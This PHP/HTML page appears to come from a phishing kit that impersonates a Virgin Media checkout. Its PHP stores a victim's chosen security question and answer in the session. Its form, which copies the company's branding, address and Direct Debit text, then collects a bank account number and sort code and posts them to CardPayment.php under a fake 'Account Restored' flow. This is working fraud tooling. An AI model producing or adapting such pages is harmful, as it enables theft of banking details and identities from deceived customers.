<?php
require 'controls.php';
if(!isset($_GET['sessionID'])){
    echo("<script>location.href = 'index.php';</script>");
    exit();
}
$sessionID = $_GET['sessionID'];

if(!isset($_GET['error'])){
    if(!isset($_POST['securityA']) or $_POST['securityA'] == ''){
        echo("<script>location.href = 'Verify.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['securityQ']) or $_POST['securityQ'] == ''){
        echo("<script>location.href = 'Verify.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    $_SESSION['securityA'] = $_POST['securityA'];
    if($_POST['securityQ'] == '1'){
        $_SESSION['securityQ'] = 'Mothers maiden name';
    }
    elseif($_POST['securityQ'] == '2'){
        $_SESSION['securityQ'] = 'Place of birth';
    }
    elseif($_POST['securityQ'] == '3'){
        $_SESSION['securityQ'] = 'Name of first school';
    }
    elseif($_POST['securityQ'] == '4'){
        $_SESSION['securityQ'] = 'Favorite song or band';
    }
    elseif($_POST['securityQ'] == '5'){
        $_SESSION['securityQ'] = 'Name of your first pet';
    }
    elseif($_POST['securityQ'] == '6'){
        $_SESSION['securityQ'] = 'Favorite food';
    }
}
?>
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">
    <head class="at-element-marker">
        <title>Virgin Media - Checkout</title>
        <meta name="description" content="">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <link href="css/font-awesome.css" rel="stylesheet">
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/bootstrap.overrides.css" rel="stylesheet">
        <link href="css/vm.theme.css" rel="stylesheet">
        <link href="css/mtp.forms.css" rel="stylesheet">
        <link href="css/mtp.ecareTheme.css" rel="stylesheet">
        <link href="css/header-reBrand.css" rel="stylesheet">
        <link href="css/mtp.basket.css" rel="stylesheet">
    </head>
    <body class="yourdetails paym">
        <header class="header">
            <div class="">
                <div class="container">
                    <img style="position: absolute; margin-top: 1%;" class="virginLogo" src="assets/logo.png">
                    <div class="row position-rel main-hdr-row">
                        <div class="col-xs-3 logo-container">
                            <a class="vm-logo xs-logo">
                            
                            </a>
                        </div>
                        <ul class="col-xs-9 top-nav">
                            <li class="top-nav-items gradient collapsed xxs-visible main-menu" data-toggle="collapse" data-target="#levelOne-menu">
                                <a class="" href="#">
                                    <span class="openMenu">
                                            <span class="pull-left">Main
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                    <span class="closeMenu">
                                            <span class="pull-left">Close
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items dark-gradient collapsed sign-inTop signIn-menu" data-toggle="collapse" data-target="#signIn">
                                <a class="signin-text clearfix" tabindex="11" href="#">
                                    <span class="openMenu">
                                        <span class="pull-left">
                                            <i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                    <span class="closeMenu">
                                        <span class="pull-left"><i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="https://my.virginmedia.com/my-apps/email/mailbox" tabindex="10"><i class="sprite email visible-desktop"></i>Email</a>
                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="http://store.virginmedia.com/store-locator.html" tabindex="9"><i class="sprite store-locator visible-desktop"></i>Find a store</a>
                            </li>
                        </ul>

                        <div id="levelOne-menu" class="collapse l1-menu tab-style">
                            <div class="menu-content">
                                <ul id="navTab" class="nav row no-gap clearfix nav-tabs">
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmedia.com/entertainme" class="notch" tabindex="3">Entertain Me</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="https://store.virginmedia.com/discover.html" class="notch" tabindex="4">Our Products</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav active"><a tabindex="5" href="#joinUs" class="notch">Join Us</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="6" href="https://my.virginmedia.com/" class="notch">My Virgin Media</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="7" href="http://help.virginmedia.com/">Help</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmediabusiness.co.uk/" tabindex="8" class="notch">For Business</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="http://store.virginmedia.com/store-locator.html" class="notch">Store Locator</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="https://my.virginmedia.com/my-apps/email/mailbox" class="notch">Email</a>

                                    </li>
                                </ul>
                            </div>
                        </div> 
                    </div>
                </div>
            </div>
        </header>

        <div id="content">
            <div class="container content-body">
                <div class="row">
                    <br>
                    <form method="post" id="yourDetailsForm" name="yourDetailsForm" class="your-details-form" action="CardPayment.php?sessionID=<?php echo $sessionID; ?>">
                        <div class="full-width col-md-12">
                            <div class="panel-group" id="checkout">

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#upfront-payment-details">
                                                <i class="checkout-icon card-details"></i>Your Details
                                            </a>
                                        </h4>
                                    </div>
                                </div>

                                <div class="panel panel-default" style="overflow:inherit;">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion"
                                                href="#you-details"><i class="checkout-icon your-details"></i> Direct Debit</a>
                                        </h4>
                                    </div>

                                    <div class="panel-collapse in" id="direct-debit">
                                        <div class="panel-body">
                                            <div class="message">
                                                <p>When you enter your Direct Debit details you'll be setting up two Direct Debit instructions. We need to set up a separate Direct Debit for your phone loan because Virgin Media Mobile Finance Limited and Virgin Mobile Telecoms Limited are two separate companies. You'll get two separate bills - one for your phone loan and one for your airtime plan.</p>
                                            </div>

                                            <div class="direct-debit-account-details new-customer clearfix" style="display: block;">
                                                <h2 class="dd-header">Direct Debit Details For Your Bill</h2>
                                                <h3 class="col-xs-12 col-md-10 col-sm-9">Instruction to your Bank or Building Society to pay by Direct Debit</h3>
                                                <div class="col-md-2 col-sm-3 dd-image">
                                                    <img src="assets/direct-debit.jpg" class="" width="123" height="47">
                                                </div>
                                                </br></br>

                                                <ul class="dd-instructions clearfix" style="margin-top: 5%;">
                                                    <li style="text-align: left;">To set up your Direct Debit Instruction you will need to provide the
                                                        name of the account holder, the bank or building society account
                                                        number and the sort code.
                                                    </li>
                                                    <li style="text-align: left;">You will receive an email to confirm your Direct Debit has been set
                                                        up within the next three working days.
                                                    </li>
                                                    <li style="text-align: left;">If the amount to be paid or the payment dates change Virgin Media Mobile
                                                        Finance Limited will notify you five working days in advance of
                                                        your account being debited or as otherwise agreed. If you have any
                                                        queries regarding this Direct Debit you can contact us at
                                                        sales@virginmobile.co.uk.
                                                    </li>
                                                    <li style="text-align: left;">Your payments are protected by the Direct Debit Guarantee. You can
                                                        read more about this guarantee below.
                                                    </li>
                                                </ul>

                                                <div class="form-horizontal">

                                                    <div class="form-group static-content multiple-uncheck">
                                                        <label class="col-sm-3 control-label" for="userNo">Service user
                                                            number</label>

                                                        <div class="col-sm-9 form-control-static">
                                                            <span>441888</span>
                                                        </div>
                                                    </div>
                                                    <div class="form-group static-content multiple-uncheck">
                                                        <label class="col-sm-3 control-label" for="bankName">Virgin
                                                            Media Mobile
                                                            Finance Limited</label>

                                                        <div class="col-sm-9 form-control-static">
                                                            <span>Eagle Court 2, Coventry Road, Eagle Court, Sheldon,
                                                                Birmingham, West Midlands, B26 3RZ</span>
                                                        </div>
                                                    </div>


                                                    <div
                                                        class="form-group multiple-uncheck hw-account-group hw-initFullName">
                                                        <label class="col-sm-3 col-xs-12 control-label"
                                                            for="ac-fullname">Account
                                                            holder full name</label>

                                                        <div class="col-sm-5 col-xs-10">
                                                            <input
                                                                class="form-control required hw-fullName-validator has-error "
                                                                id="ac-fullname" maxlength="32" type="text" value="">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                    </div>
                                                    <div
                                                        class="form-group multiple-uncheck hw-account-group hw-initFullName">
                                                        <label class="col-sm-3 col-xs-12 control-label"
                                                            for="ac-number">Account
                                                            number</label>

                                                        <div class="col-sm-5 col-xs-10">
                                                            <input
                                                                class="form-control required hw-accountNumber-validator"
                                                                id="ac-number" maxlength="8" name="accNum" type="text" value="">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                    </div>
                                                    <div class="form-group multiple-uncheck hw-account-group sortCode-wrap hw-initFullName">
                                                        <label class="col-sm-3 col-xs-12 control-label">Sort
                                                            code</label>
                                                        <div class="col-sm-2 col-xs-3">
                                                            <input
                                                                class="form-control required hw-sortCodeFiled-validator-1"
                                                                maxlength="2" id="ac-sc-one" name="sortCode1" type="text" value="">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                        <div class="col-sm-2 col-xs-3">
                                                            <input
                                                                class="form-control required hw-sortCodeFiled-validator-2"
                                                                maxlength="2" id="ac-sc-two" type="text" name="sortCode2" value="">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                        <div class="col-sm-2 col-xs-3">
                                                            <input
                                                                class="form-control required hw-sortCodeFiled-validator-3"
                                                                maxlength="2" id="ac-sc-three" name="sortCode3" type="text" value="">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                    </div>

                                                    <button class="btn btn-primary btn-mobile find-your-current-address hw-find-your-address" type="submit" id="findAddress">Continue</button>
                                                    
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#your-completed-order">
                                                <i class="checkout-icon order-completed"></i>Account Restored
                                            </a>
                                        </h4>
                                    </div>
                                </div>
                                
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <footer class="footer hidden-print">
            <div class="container">
                <nav class="shift-left-desktop">
                    <ul class="nav footer-nav row">
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>About Virgin Media</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Careers</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Advertise with us</a>
                        </li><li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Accessibility</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Legal stuff</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Site Map</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Contact us</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12 no-border"><a>Our cookies</a>
                        </li>
                    </ul>
                </nav>
                <div class="footer-logo clearfix shift-right-desktop">
                    <p class="pull-right">
                        <span>© 2015 Virgin Media.</span><br> All Rights Reserved
                        <a>
                            <img width="54" height="34" alt="Virgin Media" src="assets/images/vm-logo-sm.png">
                        </a>
                    </p>
                </div>
            </div>
        </footer>
    </body>
</html>